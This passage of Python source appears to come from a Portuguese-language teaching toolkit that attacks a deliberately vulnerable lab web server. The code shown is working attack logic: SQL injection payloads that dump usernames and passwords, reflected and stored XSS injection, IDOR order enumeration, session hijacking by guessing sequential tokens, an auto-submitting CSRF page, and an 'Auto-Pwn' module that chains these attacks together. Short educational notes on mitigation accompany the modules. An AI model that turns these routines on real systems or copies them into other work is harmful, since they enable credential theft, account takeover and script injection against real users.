    def _injetar(self, payload_sql: str) -> Optional[str]:
        """Executa injeção em /produtos?id= e extrai o valor injetado de forma precisa."""
        try:
            url = self._url_base + "/produtos?id=1" + payload_sql
            r   = _req.get(url, timeout=5, headers=_headers_extras())
            if r.status_code == 200:
                tds = re.findall(r"<td[^>]*>(.*?)</td>", r.text, re.DOTALL | re.IGNORECASE)
                tds_limpos = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
                tds_limpos = [td for td in tds_limpos if td]

                _TRIVIAIS = frozenset({"1", "2", "3", "—", "", "id", "name", "price", "Notebook Dell XPS 15"})
                prod_original = tds_limpos[1] if len(tds_limpos) > 1 else ""

                for td in reversed(tds_limpos):
                    if td in _TRIVIAIS or td == prod_original:
                        continue
                    if ":" in td or "|" in td:
                        return td

                for td in reversed(tds_limpos):
                    if td not in _TRIVIAIS and td != prod_original:
                        return td
        except Exception as e:
            aviso(f"Erro durante injeção: {e}")
        return None

    def mostrar_resultado(self) -> None:
        if not self._resultados:
            erro("Nenhuma exploração bem-sucedida nesta execução.")
            dica("Certifique-se de que o servidor NetLab está rodando e tente novamente.")
            return

        linhas = []
        for r in self._resultados:
            if isinstance(r, EvidenciaAtaque):
                linhas.append([r.tipo.upper(), r.payload[:80] or r.conclusao[:80]])
            else:
                linhas.append([
                    r.get("tipo", "dump").upper(),
                    r.get("payload", r.get("dados", ""))[:80]
                ])

        tabela_rich(linhas, ["Tipo de Resultado", "Dado Obtido"], "Resultado — SQL Injection")

        _nota_educacional(
            "SQL Injection ocorre quando dados fornecidos pelo usuário são inseridos "
            "diretamente em queries sem parametrização. A mitigação completa usa "
            "consultas parametrizadas (prepared statements), nunca concatenação de strings."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 6 — XSS Exploit
# ══════════════════════════════════════════════════════════════════════════════

class ModuloXSS(BaseAtaque):
    """Testa XSS refletido (/busca, /perfil) e armazenado (/comentarios)."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base:      str  = ""
        self._refletido:     bool = True
        self._armazenado:    bool = True
        self._usuario:       str  = "alice"
        self._senha:         str  = "alice123"
        self._achados:       List[dict] = []

    def configurar(self) -> None:
        _aviso_etico_modulo("XSS Exploit")
        _cabecalho_modulo(
            titulo="Módulo 6 — XSS Exploit",
            descricao="Injeta scripts em campos sem sanitização para execução no navegador.",
            risco="CRÍTICO — pode roubar cookies, redirecionar usuários ou executar código",
            cor_risco=_VERM,
        )
        self._url_base  = entrada(
            "URL base do servidor",
            "http://localhost:8080",
        ).rstrip("/")
        testar_conectividade(self._url_base)

        self._refletido = entrada(
            "Testar XSS refletido em /busca e /perfil? (S/n)",
            "s",
            dica_extra="XSS refletido: o payload é exibido imediatamente na resposta da mesma requisição.",
        ).lower().startswith("s")

        self._armazenado = entrada(
            "Testar XSS armazenado em /comentarios? (S/n)",
            "s",
            dica_extra="XSS armazenado: o payload é salvo no banco e executado para todo visitante.",
        ).lower().startswith("s")

        if self._armazenado:
            self._usuario = entrada(
                "Usuário para autenticação (necessário para comentários)",
                "alice",
                dica_extra="Use um dos usuários pré-cadastrados: alice, bob, carlos.",
            )
            self._senha = entrada(
                "Senha do usuário",
                "alice123",
            )

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("biblioteca 'requests' não instalada.")
            dica("Execute: pip install requests")
            return

        sess = _req.Session()

        if self._refletido:
            self._xss_refletido(sess)

        if self._armazenado:
            self._xss_armazenado(sess)

    def _xss_confirmado_no_html(self, payload: str, html_resposta: str) -> bool:
        """
        Verifica se o payload XSS foi refletido sem escape no HTML.
        Evita falsos positivos verificando estrutura, não apenas substrings genéricas.
        """
        html_lower = html_resposta.lower()
        tag_match  = re.search(r'<(\w+)', payload)
        evt_match  = re.search(r'\bon\w+\s*=', payload, re.IGNORECASE)
        href_match = re.search(r'javascript:', payload, re.IGNORECASE)

        tag_alvo  = tag_match.group(0).lower()  if tag_match  else ""
        evt_alvo  = evt_match.group(0).lower()  if evt_match  else ""
        href_alvo = "javascript:"              if href_match else ""

        indicadores = [i for i in (tag_alvo, evt_alvo, href_alvo) if i]

        if not indicadores:
            return False

        return all(ind in html_lower for ind in indicadores)

    def _xss_refletido(self, sess) -> None:
        fase(1, "XSS Refletido — /busca e /perfil")

        vetores = [
            ("/busca",  "q",    "campo de busca de produtos"),
            ("/perfil", "nome", "parâmetro de nome de usuário"),
        ]

        for endpoint, param_name, descricao in vetores:
            info(f"Testando {endpoint} ({descricao})...")
            for payload in _XSS_PAYLOADS:
                try:
                    r = sess.get(
                        self._url_base + endpoint,
                        params={param_name: payload},
                        timeout=4, headers=_headers_extras(),
                    )
                    if self._xss_confirmado_no_html(payload, r.text):
                        ok(f"XSS refletido CONFIRMADO em {endpoint}?{param_name}=")
                        ok(f"Payload executável: {payload}")
                        self._achados.append({
                            "tipo":     "Refletido",
                            "endpoint": f"{endpoint}?{param_name}=",
                            "payload":  payload,
                        })
                    else:
                        print(f"  {_DIM}· Escapado/não refletido: {payload[:50]}{_RESET}")
                    self._tentativas += 1
                    time.sleep(0.2)
                except Exception as e:
                    erro(f"Erro ao testar {endpoint}: {e}")

    def _xss_armazenado(self, sess) -> None:
        fase(2, "XSS Armazenado — /comentarios")

        try:
            r_login = sess.post(
                self._url_base + "/login",
                data={"usuario": self._usuario, "senha": self._senha},
                timeout=5, allow_redirects=False, headers=_headers_extras(),
            )
        except Exception as e:
            erro(f"Falha ao conectar ao servidor: {e}")
            return

        if not _login_bem_sucedido(r_login.status_code, r_login.text,
                                    r_login.headers.get("Location", ""),
                                    r_login.headers.get("Set-Cookie", "")):
            erro(f"Login falhou (HTTP {r_login.status_code}) — teste de XSS armazenado cancelado.")
            dica(f"Verifique usuário '{self._usuario}' e senha. Usuários padrão: alice/alice123, admin/123456.")
            return

        ok(f"Autenticado como '{self._usuario}' — pronto para injetar comentários.")

        for payload in _XSS_PAYLOADS[:3]:
            try:
                r = sess.post(
                    self._url_base + "/comentarios",
                    data={"conteudo": payload},
                    timeout=4, allow_redirects=False, headers=_headers_extras(),
                )
                if r.status_code in (200, 302):
                    r_check = sess.get(self._url_base + "/comentarios",
                                       timeout=4, headers=_headers_extras())
                    if self._xss_confirmado_no_html(payload, r_check.text):
                        ok(f"XSS ARMAZENADO CONFIRMADO em /comentarios!")
                        ok(f"Payload persistido: {payload}")
                        dica("Abra /comentarios no navegador para ver o alerta JavaScript.")
                        self._achados.append({
                            "tipo":     "Armazenado",
                            "endpoint": "/comentarios",
                            "payload":  payload,
                        })
                    else:
                        info("Comentário enviado — verificação automática inconclusiva.")
                        dica("Confirme manualmente abrindo /comentarios no navegador.")
                    self._tentativas += 1
                    time.sleep(0.3)
            except Exception as e:
                erro(f"Erro ao enviar comentário: {e}")

    def mostrar_resultado(self) -> None:
        if self._achados:
            tabela_rich([
                [a["tipo"], a["endpoint"], a["payload"][:55]]
                for a in self._achados
            ], ["Tipo XSS", "Endpoint Vulnerável", "Payload Confirmado"], "Resultado — XSS")
        else:
            info("Nenhum XSS confirmado automaticamente.")
            dica("Teste manualmente no navegador abrindo as URLs com payloads para confirmar.")

        _nota_educacional(
            "XSS é mitigado com escape de saída contextual (HTML entities) e "
            "Content-Security-Policy (CSP) que bloqueia execução de scripts inline. "
            "O XSS armazenado é mais perigoso pois afeta todos os visitantes futuros."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 7 — IDOR Exploit
# ══════════════════════════════════════════════════════════════════════════════

class ModuloIDOR(BaseAtaque):
    """
    Acessa pedidos de outros usuários sem autenticação via /pedidos?id=N.
    O servidor não valida se o pedido pertence ao usuário logado.
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:    str  = ""
        self._max_id:      int  = 20
        self._concorrencia: int = 10
        self._achados:     List[Tuple[int, str, str]] = []

    def configurar(self) -> None:
        _aviso_etico_modulo("IDOR Exploit")
        _cabecalho_modulo(
            titulo="Módulo 7 — IDOR Exploit",
            descricao="Acessa recursos de outros usuários sem verificação de autorização.",
            risco="ALTO — expõe dados privados de qualquer usuário do sistema",
            cor_risco=_VERM,
        )
        self._url_base  = entrada(
            "URL base do servidor",
            "http://localhost:8080",
        ).rstrip("/")
        testar_conectividade(self._url_base)

        self._max_id = int(entrada(
            "ID máximo de pedido a testar",
            "20",
            dica_extra="O NetLab começa com 5 pedidos. Tente até 20 para cobrir todos.",
        ))
        self._concorrencia = int(entrada(
            "Requisições paralelas",
            "10",
            dica_extra="Aumentar este valor acelera o teste.",
        ))

    def executar(self) -> None:
        info(f"Enumerando pedidos de #1 a #{self._max_id} sem autenticação...")
        if _AIOHTTP_OK:
            asyncio.run(self._async_main())
        elif _REQUESTS_OK:
            self._sync_main()
        else:
            erro("Nenhuma biblioteca HTTP disponível.")
            dica("Execute: pip install aiohttp requests")

    async def _async_main(self) -> None:
        sem = asyncio.Semaphore(self._concorrencia)
        conn = aiohttp.TCPConnector(ssl=False)
        tobj = aiohttp.ClientTimeout(total=5.0)
        async with aiohttp.ClientSession(connector=conn, timeout=tobj) as sess:
            tarefas = [
                asyncio.create_task(self._checar_pedido(sess, sem, i))
                for i in range(1, self._max_id + 1)
            ]
            await asyncio.gather(*tarefas, return_exceptions=True)

    async def _checar_pedido(self, sess, sem: asyncio.Semaphore, pid: int) -> None:
        async with sem:
            url = f"{self._url_base}/pedidos?id={pid}"
            try:
                async with sess.get(url, headers={"User-Agent": _ua()}) as resp:
                    if resp.status == 200:
                        texto = await resp.text(errors="ignore")
                        self._processar_resposta(pid, texto)
                    else:
                        print(f"  {_DIM}· Pedido #{pid}: HTTP {resp.status}{_RESET}")
                    self._tentativas += 1
            except Exception:
                self._erros += 1

    def _sync_main(self) -> None:
        sess = _req.Session()
        for pid in range(1, self._max_id + 1):
            url = f"{self._url_base}/pedidos?id={pid}"
            try:
                r = sess.get(url, timeout=5, headers={"User-Agent": _ua()})
                if r.status_code == 200:
                    self._processar_resposta(pid, r.text)
                else:
                    print(f"  {_DIM}· Pedido #{pid}: HTTP {r.status_code}{_RESET}")
                self._tentativas += 1
            except Exception:
                self._erros += 1
            time.sleep(0.1)

    def _processar_resposta(self, pid: int, texto: str) -> None:
        """Extrai dono e produto do HTML do pedido retornado sem autenticação."""
        if "Pedido #" not in texto and "Usu" not in texto:
            print(f"  {_DIM}· Pedido #{pid}: não encontrado{_RESET}")
            return

        tds = re.findall(r"<td[^>]*>(.*?)</td>", texto, re.DOTALL | re.IGNORECASE)
        tds = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
        tds = [td for td in tds if td]

        dados: dict = {}
        i = 0
        while i + 1 < len(tds):
            chave = tds[i].lower()
            valor = tds[i + 1]
            if "usu" in chave:
                dados["usuario"] = valor
            elif "produto" in chave:
                dados["produto"] = valor
            elif "total" in chave:
                dados["total"] = valor
            i += 2

        if "usuario" not in dados:
            for td in tds:
                if re.match(r"^[a-zA-Z0-9_.]{2,30}$", td) and td.lower() not in _LABELS_TABELA_IDOR:
                    dados["usuario"] = td
                    break

        usuario = dados.get("usuario", "desconhecido")
        produto = dados.get("produto", "—")

        ok(f"Pedido #{pid} exposto sem autenticação — dono: {_BOLD}{usuario}{_RESET}  produto: {produto}")
        self._achados.append((pid, usuario, produto))

    def mostrar_resultado(self) -> None:
        if self._achados:
            tabela_rich([
                [str(pid), usuario, produto]
                for pid, usuario, produto in sorted(self._achados)
            ], ["ID Pedido", "Usuário Dono (exposto)", "Produto"], "Resultado — IDOR")
        else:
            erro("Nenhum pedido acessível encontrado.")
            dica("Verifique se há pedidos cadastrados no servidor (abra /pedidos?id=1 no navegador).")

        tabela_rich([
            ["IDs testados",        str(self._tentativas)],
            ["Pedidos expostos",    str(len(self._achados))],
            ["Erros de conexão",    str(self._erros)],
        ], ["Métrica", "Valor"], "Resumo — IDOR")

        _nota_educacional(
            "IDOR (Insecure Direct Object Reference) é corrigido verificando, "
            "a cada requisição, se o recurso pertence ao usuário autenticado. "
            "Nunca confie apenas no ID fornecido na URL — sempre valide no servidor."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 8 — Session Hijack
# ══════════════════════════════════════════════════════════════════════════════

class ModuloSessionHijack(BaseAtaque):
    """
    Explora tokens de sessão sequenciais e previsíveis (token1, token2...).
    O servidor gera tokens como f"token{contador}" — trivialmente enumeráveis.
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:        str  = ""
        self._max_token:       int  = 50
        self._sessoes_roubadas: List[Tuple[str, str]] = []

    def configurar(self) -> None:
        _aviso_etico_modulo("Session Hijack")
        _cabecalho_modulo(
            titulo="Módulo 8 — Session Hijack",
            descricao="Enumera tokens de sessão sequenciais para assumir contas ativas.",
            risco="CRÍTICO — permite impersonar qualquer usuário com sessão ativa",
            cor_risco=_VERM,
        )
        self._url_base  = entrada(
            "URL base do servidor",
            "http://localhost:8080",
        ).rstrip("/")
        testar_conectividade(self._url_base)

        self._max_token = int(entrada(
            "Quantidade de tokens a enumerar (token1 até tokenN)",
            "50",
            dica_extra="O servidor gera tokens sequenciais: token1, token2, token3...",
        ))

        dica("Faça alguns logins no servidor NetLab antes de executar.")
        dica("Acesse /login no navegador e entre com alice/alice123 para criar sessões.")

    def _token_de_sessao_valido(
        self,
        status: int,
        corpo: str,
        token: str,
    ) -> Tuple[bool, str]:
        """Valida token de sessão com critérios específicos do NetLab."""
        if status != 200:
            return False, ""

        corpo_lower = corpo.lower()
        _INDICADORES_SESSAO = (
            "sessão ativa", "sessao ativa", "sess&atilde;o ativa",
            "encerrar sessão", "encerrar sessao",
            "iniciada como",
        )
        if not any(ind in corpo_lower for ind in _INDICADORES_SESSAO):
            return False, ""

        if any(k in corpo_lower for k in _KW_FALHA):
            return False, ""

        usuario = _extrair_usuario_do_corpo(corpo)
        return True, usuario or "desconhecido"

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("biblioteca 'requests' não instalada.")
            dica("Execute: pip install requests")
            return

        info(f"Enumerando tokens token1 até token{self._max_token}...")
        info("Cada token é testado como cookie de sessão na rota /\n")

        sess = _req.Session()

        for i in range(1, self._max_token + 1):
            token = f"token{i}"
            try:
                r = sess.get(
                    self._url_base + "/",
                    cookies={"sessao": token},
                    timeout=4,
                    allow_redirects=False,
                    headers={"User-Agent": _ua()},
                )
                self._tentativas += 1

                valido, usuario = self._token_de_sessao_valido(r.status_code, r.text, token)
                if valido:
                    ok(f"Token válido encontrado: {_BOLD}{token}{_RESET} → conta: {_BOLD}{usuario}{_RESET}")
                    self._sessoes_roubadas.append((token, usuario))
                else:
                    print(f"  {_DIM}· {token}: inativo (HTTP {r.status_code}){_RESET}")

            except Exception as e:
                erro(f"Erro ao testar {token}: {e}")
                self._erros += 1

            time.sleep(0.08)

    def mostrar_resultado(self) -> None:
        if self._sessoes_roubadas:
            tabela_rich(
                [[tok, usr] for tok, usr in self._sessoes_roubadas],
                ["Token de Sessão", "Conta Comprometida"],
                "Sessões Sequestradas — Session Hijack",
            )
            info("Como usar: defina o cookie 'sessao=<token>' no navegador para assumir a conta.")
            dica("No Chrome: F12 → Application → Cookies → adicione o cookie manualmente.")
        else:
            erro("Nenhum token válido encontrado no intervalo testado.")
            dica("Faça logins no servidor antes de executar: acesse /login no navegador.")

        tabela_rich([
            ["Tokens testados",    str(self._tentativas)],
            ["Sessões capturadas", str(len(self._sessoes_roubadas))],
            ["Erros",              str(self._erros)],
        ], ["Métrica", "Valor"], "Resumo — Session Hijack")

        _nota_educacional(
            "Tokens de sessão devem ser gerados com pelo menos 128 bits de entropia "
            "usando um gerador criptográfico (os.urandom, secrets.token_hex). "
            "Tokens sequenciais como 'token1' são trivialmente enumeráveis."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 9 — CSRF PoC
# ══════════════════════════════════════════════════════════════════════════════

class ModuloCSRF(BaseAtaque):
    """Gera página HTML que posta comentário em nome de um usuário autenticado."""

    def __init__(self) -> None:
        super().__init__()
        self._url_base: str = ""
        self._conteudo: str = "CSRF_vulnerability_demo — postado sem consentimento"
        self._arquivo:  str = "csrf_poc.html"

    def configurar(self) -> None:
        _aviso_etico_modulo("CSRF PoC")
        _cabecalho_modulo(
            titulo="Módulo 9 — CSRF Proof of Concept",
            descricao="Gera uma página que realiza ações em nome de um usuário logado.",
            risco="MÉDIO — requer que a vítima abra o arquivo estando autenticada",
            cor_risco=_AMAR,
        )
        self._url_base = entrada(
            "URL base do servidor",
            "http://localhost:8080",
            dica_extra="O arquivo HTML gerado usará este endereço como destino do formulário.",
        ).rstrip("/")

        self._conteudo = entrada(
            "Conteúdo do comentário que será postado automaticamente",
            "CSRF_vulnerability_demo — postado sem consentimento",
            dica_extra="Este texto aparecerá em /comentarios após a vítima abrir o arquivo.",
        )
        self._arquivo = entrada(
            "Nome do arquivo HTML de saída",
            "csrf_poc.html",
            dica_extra="Será criado no diretório atual. Ex: csrf_poc.html",
        )

    def executar(self) -> None:
        url_alvo = self._url_base + "/comentarios"
        html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC — NetLab Educacional</title>
  <style>
    body {{ font-family: sans-serif; background: #111; color: #eee;
            display: flex; flex-direction: column; align-items: center;
            justify-content: center; height: 100vh; margin: 0; }}
    h2   {{ color: #ff4444; }}
    p    {{ max-width: 500px; text-align: center; color: #aaa; }}
    code {{ background: #222; padding: 4px 8px; border-radius: 4px; color: #7cf; }}
  </style>
</head>
<body>
  <h2>⚠ CSRF Proof of Concept — NetLab Educacional</h2>
  <p>
    Se você estiver logado em <code>{self._url_base}</code>,
    este formulário oculto será submetido automaticamente ao carregar esta página,
    postando um comentário em seu nome — sem qualquer confirmação ou interação.
  </p>
  <p>Enviando... aguarde o redirecionamento.</p>

  <!-- Formulário oculto auto-submetido — sem token CSRF de proteção -->
  <form id="csrf_form"
        action="{url_alvo}"
        method="POST"
        style="display:none;">
    <input type="hidden" name="conteudo" value="{self._conteudo}">
  </form>

  <script>
    // Submissão automática ao carregar — simula o ataque CSRF
    document.getElementById('csrf_form').submit();
  </script>
</body>
</html>"""

        try:
            with open(self._arquivo, "w", encoding="utf-8") as f:
                f.write(html)
            ok(f"Arquivo PoC gerado com sucesso: '{self._arquivo}'")
            print(f"\n  {_CIANO}{_BOLD}Como demonstrar em sala de aula:{_RESET}")
            info("  1. Acesse /login no NetLab e autentique-se (ex: alice / alice123).")
            info(f"  2. Sem fazer logout, abra '{self._arquivo}' no MESMO navegador.")
            info("  3. O comentário será postado automaticamente em /comentarios.")
            info("  4. A vítima nunca clicou em 'Enviar' — é CSRF puro.")
            dica("   Verifique /comentarios no servidor para confirmar o ataque.")
        except Exception as e:
            erro(f"Erro ao salvar o arquivo: {e}")
            dica("Verifique as permissões de escrita no diretório atual.")

    def mostrar_resultado(self) -> None:
        info("O arquivo CSRF PoC foi gerado. Nenhuma requisição foi enviada automaticamente.")
        info("A demonstração requer abrir o arquivo HTML em um navegador autenticado no servidor.")

        _nota_educacional(
            "CSRF é mitigado com tokens anti-CSRF únicos por formulário (CSRF tokens), "
            "verificação do header Origin/Referer e uso do atributo SameSite=Strict "
            "nos cookies de sessão. O NetLab não usa nenhuma dessas proteções."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Módulo 10 — Auto-Pwn (Encadeamento de Exploits)
# ══════════════════════════════════════════════════════════════════════════════

class ModuloAutoPwn(BaseAtaque):
    """
    Encadeia automaticamente:
      Fase 1 — SQLi bypass de login  →  obtém sessão admin
      Fase 2 — UNION SELECT          →  extrai todos os usuários e senhas
      Fase 3 — IDOR                  →  acessa todos os pedidos
      Fase 4 — XSS armazenado        →  injeta payload em /comentarios
    """

    def __init__(self) -> None:
        super().__init__()
        self._url_base:    str  = ""
        self._credenciais: Optional[Tuple[str, str]] = None
        self._cookie:      str  = ""
        self._log:         List[str] = []

    def configurar(self) -> None:
        _aviso_etico_modulo("Auto-Pwn (Encadeamento)")
        _cabecalho_modulo(
            titulo="Módulo 10 — Auto-Pwn (Encadeamento de Exploits)",
            descricao="Executa todas as fases de ataque em sequência automática.",
            risco="CRÍTICO — demonstra impacto real de múltiplas vulnerabilidades combinadas",
            cor_risco=_VERM,
        )

        print(f"  {_DIM}Sequência de execução:{_RESET}")
        print(f"    {_BOLD}Fase 1a{_RESET}  SQL Injection → bypass de autenticação")
        print(f"    {_BOLD}Fase 1b{_RESET}  UNION SELECT → extração de credenciais")
        print(f"    {_BOLD}Fase 2{_RESET}   Login legítimo com credenciais obtidas")
        print(f"    {_BOLD}Fase 3{_RESET}   IDOR → acesso a todos os pedidos")
        print(f"    {_BOLD}Fase 4{_RESET}   XSS armazenado em /comentarios")
        print()

        self._url_base = entrada(
            "URL base do servidor",
            "http://localhost:8080",
        ).rstrip("/")
        testar_conectividade(self._url_base)
        info("O Auto-Pwn executará todas as fases acima automaticamente.")

    def executar(self) -> None:
        if not _REQUESTS_OK:
            erro("biblioteca 'requests' não instalada.")
            dica("Execute: pip install requests")
            return

        self._fase1_sqli_bypass()
        if not self._credenciais:
            aviso("Bypass SQLi falhou — tentando extração via UNION SELECT...")
            self._fase1b_union_creds()

        if self._credenciais:
            self._fase2_login_legitimo()
            self._fase3_idor()
            self._fase4_xss()
        else:
            erro("Não foi possível obter credenciais em nenhuma fase.")
            dica("Verifique se o servidor NetLab está rodando e tente novamente.")

    def _fase1_sqli_bypass(self) -> None:
        fase(1, "SQL Injection — bypass de autenticação")
        sess = _req.Session()
        for payload in _SQLI_BYPASS:
            try:
                r = sess.post(
                    self._url_base + "/login",
                    data={"usuario": "admin", "senha": payload},
                    timeout=5, allow_redirects=False, headers=_headers_extras(),
                )
                if _login_bem_sucedido(r.status_code, r.text,
                                        r.headers.get("Location", ""),
                                        r.headers.get("Set-Cookie", "")):
                    ok(f"Bypass bem-sucedido com payload: {payload!r}")
                    self._cookie = r.headers.get("Set-Cookie", "")
                    m = re.search(r"iniciada como.*?<strong>(.*?)</strong>",
                                  r.text, re.IGNORECASE | re.DOTALL)
                    usuario = m.group(1).strip() if m else "admin"
                    self._credenciais = (usuario, payload)
                    self._log.append(f"SQLi bypass → usuário: {usuario} / payload: {payload!r}")
                    return
            except Exception as e:
                aviso(f"Erro no bypass: {e}")
            time.sleep(0.2)

    def _fase1b_union_creds(self) -> None:
        fase(2, "UNION SELECT — extração de credenciais do banco")
        payloads = [
            " UNION SELECT 1,(SELECT username||':'||password FROM users WHERE role='admin' LIMIT 1),1--",
            " UNION SELECT 1,(SELECT username||':'||password FROM users LIMIT 1),1--",
            " UNION SELECT 1,(SELECT group_concat(username||':'||password,'|') FROM users),1--",
        ]
        for payload in payloads:
            resultado = self._injetar_union(payload)
            if resultado and ":" in resultado:
                partes = resultado.split("|")[0].split(":", 1)
                if len(partes) == 2:
                    usuario, senha = partes[0].strip(), partes[1].strip()
                    ok(f"Credenciais extraídas via UNION: {usuario}:{senha}")
                    self._credenciais = (usuario, senha)
                    self._log.append(f"UNION dump → {usuario}:{senha}")
                    return
            time.sleep(0.2)

    def _injetar_union(self, payload: str) -> Optional[str]:
        try:
            r = _req.get(
                self._url_base + "/produtos?id=1" + payload,
                timeout=5, headers=_headers_extras(),
            )
            if r.status_code == 200:
                tds = re.findall(r"<td[^>]*>(.*?)</td>", r.text, re.DOTALL | re.IGNORECASE)
                tds = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
                for td in tds:
                    if td and td not in ("1", "2", "3", "—", ""):
                        return td
        except Exception:
            pass
        return None

    def _fase2_login_legitimo(self) -> None:
        fase(3, "Login legítimo com credenciais obtidas")
        usuario, senha = self._credenciais  # type: ignore
        try:
            r = _req.post(
                self._url_base + "/login",
                data={"usuario": usuario, "senha": senha},
                timeout=5, allow_redirects=False, headers=_headers_extras(),
            )
            if _login_bem_sucedido(r.status_code, r.text,
                                    r.headers.get("Location", ""),
                                    r.headers.get("Set-Cookie", "")):
                ok(f"Sessão estabelecida como '{usuario}'.")
                self._cookie = r.headers.get("Set-Cookie", "")
                self._log.append(f"Login legítimo: {usuario}")
            else:
                aviso(f"Login com credenciais falhou (HTTP {r.status_code}).")
                dica("O bypass SQLi pode ter criado uma sessão temporária. Prosseguindo.")
        except Exception as e:
            erro(f"Erro no login legítimo: {e}")

    def _fase3_idor(self) -> None:
        fase(4, "IDOR — enumeração de pedidos de outros usuários")
        sess = _req.Session()
        if self._cookie:
            nome, valor = self._cookie.split("=", 1) if "=" in self._cookie else ("", "")
            if nome:
                sess.cookies.set(nome.strip(), valor.split(";")[0].strip())

        encontrados = 0
        for pid in range(1, 11):
            try:
                r = sess.get(f"{self._url_base}/pedidos?id={pid}",
                             timeout=4, headers={"User-Agent": _ua()})
                if r.status_code == 200 and "Pedido #" in r.text:
                    tds = re.findall(r"<td[^>]*>(.*?)</td>", r.text,
                                     re.DOTALL | re.IGNORECASE)
                    tds = [re.sub(r"<[^>]+>", "", td).strip() for td in tds]
                    dono = next((td for td in tds
                                 if re.match(r"^[a-zA-Z0-9_.]{2,30}$", td)
                                 and td.lower() not in _LABELS_TABELA_IDOR), "desconhecido")
                    ok(f"Pedido #{pid} exposto — dono: {dono}")
                    encontrados += 1
                time.sleep(0.15)
            except Exception:
                pass
        self._log.append(f"IDOR: {encontrados} pedido(s) exposto(s)")

    def _fase4_xss(self) -> None:
        fase(5, "XSS armazenado em /comentarios")
        if not self._credenciais:
            return

        usuario, senha = self._credenciais  # type: ignore
        sess = _req.Session()
        try:
            r_l = sess.post(
                self._url_base + "/login",
                data={"usuario": usuario, "senha": senha},
                timeout=5, allow_redirects=False, headers=_headers_extras(),
            )
            if not _login_bem_sucedido(r_l.status_code, r_l.text,
                                        r_l.headers.get("Location", ""),
                                        r_l.headers.get("Set-Cookie", "")):
                for payload in _SQLI_BYPASS:
                    r_l = sess.post(
                        self._url_base + "/login",
                        data={"usuario": "admin", "senha": payload},
                        timeout=5, allow_redirects=False, headers=_headers_extras(),
                    )
                    if _login_bem_sucedido(r_l.status_code, r_l.text,
                                           r_l.headers.get("Location", ""),
                                           r_l.headers.get("Set-Cookie", "")):
                        cookie = r_l.headers.get("Set-Cookie", "")
                        if cookie:
                            nome_cookie, valor = cookie.split("=", 1) if "=" in cookie else ("", "")
                            if nome_cookie:
                                sess.cookies.set(nome_cookie.strip(), valor.split(";")[0].strip())
                        break
                else:
                    erro("Não foi possível autenticar para o XSS armazenado.")
                    return

            xss_payload = "<script>alert('AutoPwn XSS — NetLab')</script>"
            r = sess.post(
                self._url_base + "/comentarios",
                data={"conteudo": xss_payload},
                timeout=4, allow_redirects=False, headers=_headers_extras(),
            )
            if r.status_code in (200, 302):
                ok("XSS armazenado injetado com sucesso em /comentarios!")
                info(f"Payload persistido: {xss_payload}")
                self._log.append("XSS armazenado: confirmado")
            else:
                aviso(f"XSS armazenado: resposta HTTP {r.status_code}")
        except Exception as e:
            erro(f"Erro na fase XSS: {e}")

    def mostrar_resultado(self) -> None:
        print(f"\n  {_VERDE}{_BOLD}{'═' * 58}")
        print(f"  ✓  AUTO-PWN CONCLUÍDO — Resumo do encadeamento")
        print(f"  {'═' * 58}{_RESET}\n")

        for etapa, linha in enumerate(self._log, 1):
            ok(f"Etapa {etapa}: {linha}")

        if self._credenciais:
            usuario, senha = self._credenciais
            print(f"\n  {_BOLD}Credenciais obtidas:{_RESET}")
            print(f"    Usuário : {usuario}")
            print(f"    Senha   : {senha}")
        print()

        _nota_educacional(
            "O encadeamento de vulnerabilidades demonstra como uma única brecha "
            "(SQLi no login) permite escalar para comprometimento total do sistema: "
            "dump de credenciais, acesso a dados privados e injeção de código "
            "persistente que afeta todos os usuários futuros."
        )


# ══════════════════════════════════════════════════════════════════════════════
# Mapa de módulos disponíveis
# ══════════════════════════════════════════════════════════════════════════════

# Estrutura: chave → (nome, classe, categoria, nível de risco, descrição resumida)
_MODULOS: Dict[str, Tuple] = {
    "1":  ("Força Bruta Assíncrona",    ModuloBruteForce,    "OFENSIVO",     "ALTO",
           "Testa senhas em /login sem limite de tentativas"),
    "2":  ("Teste de Estresse / DoS",   ModuloEstresse,      "OFENSIVO",     "MUITO ALTO",
           "HTTP flood, TCP, Slowloris e UDP flood"),
    "3":  ("Scanner de Endpoints",      ModuloScanner,       "RECONHECIMENTO","MÉDIO",
           "Enumera rotas e analisa headers de segurança"),
    "4":  ("Interceptação HTTP",        ModuloIntercepcaoHTTP,"DEMONSTRAÇÃO", "INFORMATIVO",
           "Mostra dados de formulários visíveis na rede"),
    "5":  ("SQL Injection Exploit",     ModuloSQLInjection,  "OFENSIVO",     "CRÍTICO",
           "Bypass de login e extração de dados via UNION SELECT"),
    "6":  ("XSS Exploit",               ModuloXSS,           "OFENSIVO",     "CRÍTICO",
           "Refletido (/busca, /perfil) e armazenado (/comentarios)"),
    "7":  ("IDOR Exploit",              ModuloIDOR,           "OFENSIVO",     "ALTO",
           "Acessa pedidos de outros usuários sem autenticação"),
    "8":  ("Session Hijack",            ModuloSessionHijack, "OFENSIVO",     "CRÍTICO",
           "Enumera tokens sequenciais para sequestrar sessões"),
    "9":  ("CSRF PoC",                  ModuloCSRF,           "DEMONSTRAÇÃO", "MÉDIO",
           "Gera HTML que age em nome de usuário autenticado"),
    "10": ("Auto-Pwn (Encadeamento)",   ModuloAutoPwn,        "OFENSIVO",     "CRÍTICO",
           "SQLi → credenciais → IDOR → XSS em sequência"),
}

# Mapeamento de risco para cor de exibição
_CORES_RISCO = {
    "INFORMATIVO": _CIANO,
    "MÉDIO":       _AMAR,
    "ALTO":        _AMAR,
    "MUITO ALTO":  _VERM,
    "CRÍTICO":     _VERM,
}


# ══════════════════════════════════════════════════════════════════════════════
# Verificação de dependências
# ══════════════════════════════════════════════════════════════════════════════

def _checar_deps() -> None:
    """
    Verifica dependências e alerta sobre módulos que ficam indisponíveis.
